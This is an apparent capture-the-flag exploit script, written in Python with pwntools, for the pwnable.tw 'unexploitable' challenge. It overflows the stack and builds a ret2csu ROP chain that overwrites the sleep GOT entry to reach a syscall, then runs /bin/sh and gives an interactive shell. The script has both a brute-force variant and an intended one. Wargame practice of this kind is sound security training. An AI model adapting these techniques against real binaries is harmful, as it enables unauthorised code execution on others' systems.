#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys
import time

local = 0
debug = 0
bruteforce = 0

def conn():
	global local
	global debug
	global bruteforce

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			print('        -b, --bruteforce:    Use my solution bruteforce 4 bit')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1
		if arg in ('-b', '--bruteforce'):
			bruteforce = 1

	if local:
		s = process('./unexploitable_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x400577
				b*0x4005d0
				b*0x4005e6
				b*__libc_system
				c
			''')
		else:
			#raw_input('DEBUG')
			pass
	else:
		s = remote('chall.pwnable.tw', 10403)

	return s

elf = ELF('unexploitable')
libc = ELF('libc_64.so.6')

bss = 0x601000
ret2csu_1 = 0x4005e6
ret2csu_2 = 0x4005d0

if bruteforce: # my solution
	payload = b'A' * 0x18 + p64(ret2csu_1)
	payload += p64(0) * 2 + p64(1) + p64(elf.got['read']) + p64(0) + p64(elf.got['sleep']) + p64(0x2)
	payload += p64(ret2csu_2)
	payload += p64(0) * 2 + p64(1) + p64(elf.got['read']) + p64(0) + p64(bss + 0x500) + p64(8)
	payload += p64(ret2csu_2)
	payload += p64(0) * 3 + p64(elf.got['sleep']) + p64(bss + 0x500) + p64(0) + p64(0)
	payload += p64(ret2csu_2)
	payload += b'A' * 0x1f
	while True:
		try:
			s = conn()

			s.sendline(payload)
			s.sendline(b'\xc0\xbb/bin/sh\x00')

			s.clean()
			s.sendline(b'ls')
			s.recv()

			break
		except:
			s.close()
else: # intended solution
	s = conn()

	payload = b'A' * 0x18 + p64(ret2csu_1)
	payload += p64(0) * 2 + p64(1) + p64(elf.got['read']) + p64(0) + p64(elf.got['sleep']) + p64(0x1)
	payload += p64(ret2csu_2)
	payload += p64(0) * 2 + p64(1) + p64(elf.got['read']) + p64(0) + p64(bss + 0x500) + p64(0x3b)
	payload += p64(ret2csu_2)
	payload += p64(0) * 3 + p64(elf.got['sleep']) + p64(bss + 0x500) + p64(0) + p64(0)
	payload += p64(ret2csu_2)
	payload += b'A' * 0x1f

	s.sendline(payload)
	s.sendline(b'\xde/bin/sh\x00' + b'A' * 50)

s.interactive()
